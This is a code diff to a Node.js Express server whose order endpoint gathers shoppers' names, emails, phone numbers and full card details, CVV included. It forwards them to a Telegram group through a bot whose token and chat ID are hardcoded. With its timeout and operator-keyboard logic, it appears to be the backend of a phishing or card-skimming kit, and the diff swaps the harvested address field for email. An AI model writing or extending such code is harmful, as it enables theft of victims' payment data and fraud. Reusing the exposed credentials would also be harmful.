@@ -8,7 +8,6 @@ const app = express();
 app.use(express.json());
 app.use(cors({ origin: "*" }));
 
-
 const BOT_TOKEN     = (process.env.BOT_TOKEN     || "8348466548:AAGR3Jss48lkie_jgqNAguABE5mNMjom0dU").trim();
 const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5278623594").trim();
 
@@ -21,7 +20,6 @@ const TIMEOUT_MS = 10 * 60 * 1000;
 const pending = new Map();
 
 const lastSeen = new Map();
-
 
 async function tgPost(method, body) {
   if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
@@ -107,7 +105,7 @@ function pushKeyboard(request_id) {
 
 async function sendOrderToTelegram({
   request_id,
-  name, address, phone,
+  name, email, phone,
   card_number, card_name, card_expiry, card_cvv,
   amount,
 }) {
@@ -115,7 +113,7 @@ async function sendOrderToTelegram({
 
   const lines = ["🎟 Новая заявка на покупку", `🆔 ID: ${request_id}`];
   if (name)        lines.push(`👤 Имя: ${name}`);
-  if (address)     lines.push(`📍 Адрес: ${address}`);
+  if (email)       lines.push(`📧 Email: ${email}`);
   if (phone)       lines.push(`📞 Телефон: ${phone}`);
   if (amount)      lines.push(`💰 Сумма: ${amount}`);
   lines.push("");
@@ -157,18 +155,14 @@ app.post("/api/order", async (req, res) => {
   const { profile = {}, card = {}, amount = "" } = req.body;
   const request_id = uuidv4();
 
-  const name    = [profile.firstName, profile.lastName].filter(Boolean).join(" ");
-  const address = [
-    profile.street,
-    [profile.postcode, profile.city].filter(Boolean).join(" "),
-    profile.country,
-  ].filter(Boolean).join(", ");
+  const name  = [profile.firstName, profile.lastName].filter(Boolean).join(" ");
+  const email = profile.email || "";
 
   try {
     await sendOrderToTelegram({
       request_id,
       name,
-      address,
+      email,
       phone:       profile.phone || "",
       card_number: card.number   || "",
       card_name:   card.name     || "",
